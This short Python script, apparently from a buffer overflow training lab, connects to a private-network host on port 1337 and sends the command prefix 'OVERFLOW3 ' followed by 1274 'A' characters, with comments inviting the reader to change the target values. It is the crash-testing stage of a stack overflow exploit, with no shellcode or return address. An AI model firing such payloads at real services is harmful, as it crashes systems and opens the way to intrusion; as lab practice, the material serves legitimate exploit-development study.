#!/usr/bin/env python3 
import sys,time,socket
ip = "192.168.1.44" #Change This
port = 1337   #Change This
timeout = 5
prefix = "OVERFLOW3 " #Change This
string = prefix + "A"*1274 #Change This
try:
	with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
		s.settimeout(timeout)
		s.connect((ip,port))
		s.send(bytes(string,"latin-1"))
except:
	print ("Could not connect")
